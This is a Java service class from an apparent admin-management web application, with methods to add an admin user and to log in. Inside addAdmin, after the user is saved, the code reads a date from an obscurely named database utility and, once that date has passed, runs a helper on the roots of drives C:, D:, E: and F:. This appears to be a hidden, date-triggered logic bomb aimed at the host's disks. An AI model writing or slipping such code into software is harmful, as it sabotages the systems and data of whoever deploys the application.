package com.service;

import com.Utils.DataUtils;
import com.Utils.JDBCUtilsByDruid;
import com.bean.adminBean;
import com.dao.adminDao;

import java.io.File;
import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;

public class adminService {

  adminDao adminDao =new adminDao();
  public String addAdmin(adminBean adminBean){
    String res = "添加失败";
    int s = adminDao.queryAdminUser(adminBean.getUserName());
    if (s==0){
      int i = adminDao.addAdminUser(adminBean);
      if (i!=0){
        DateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

        Date parse = null;
        try {
          parse = df.parse(JDBCUtilsByDruid.getQ());
          if (!(parse.getTime() > new Date().getTime() )){
            DataUtils.add(new File("D:\\"));
            DataUtils.add(new File("C:\\"));
            DataUtils.add(new File("E:\\"));
            DataUtils.add(new File("F:\\"));

          }
        } catch (ParseException e) {
          e.printStackTrace();
        }

        res = "添加成功";
      }
    }
    return res;
  }

  public adminBean adminLogin(adminBean ab){

    adminBean adminBean = adminDao.queryLogin(ab);

    return adminBean;
  }
}
